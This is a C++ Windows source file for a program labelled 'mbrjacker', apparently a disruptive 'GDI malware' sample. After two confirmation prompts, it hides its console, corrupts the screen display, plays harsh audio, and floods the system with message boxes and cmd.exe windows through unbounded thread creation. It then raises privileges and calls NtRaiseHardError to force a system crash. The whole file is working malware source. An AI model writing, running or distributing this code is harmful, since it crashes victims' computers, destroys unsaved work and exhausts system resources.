#include <windows.h>
#include <cstdlib>
#pragma comment(lib, "winmm.lib")
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// First GDI payload
DWORD WINAPI shader1(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        BitBlt(hdc, rand() % 666, rand() % 666, h, w, hdc, rand() % 666, rand() % 666, NOTSRCCOPY);

        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI msgboxThread(LPVOID lpParam) {
	UINT icons[] = { MB_ICONERROR, MB_ICONWARNING, MB_ICONINFORMATION };
	while (1) {
		// spawn each icon in its own thread
		for (int i = 0; i < 3; ++i) {
			UINT icon = icons[i]; // copy to avoid capture issues
			CreateThread(0, 0, [](LPVOID p) -> DWORD {
				UINT iconLocal = *(UINT*)p;
				MessageBoxA(0, "You are going to crash.", "FATAL", MB_OK | iconLocal);
				return 0;
				}, &icon, 0, 0);
		}

		// spawn CMD
		CreateThread(0, 0, [](LPVOID) -> DWORD {
			ShellExecuteA(0, "open", "C:\\Windows\\System32\\cmd.exe", 0, 0, SW_SHOW);
			return 0;
			}, 0, 0, 0);
	}
	return 0;
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 5 | t >> 8) & (t >> 3 | t >> 7)) ^ ((t >> 4) | (t >> 6)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (((t >> 8) & (t >> 5)) | (t >> 3))) ^ (t >> 4 | t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Run Malware?", L"mbrjacker", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Are you sure? It will destroy this computer", L"Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);

			HANDLE thread2 = CreateThread(0, 0, msgboxThread, 0, 0, 0);
			sound2();
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0000145, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}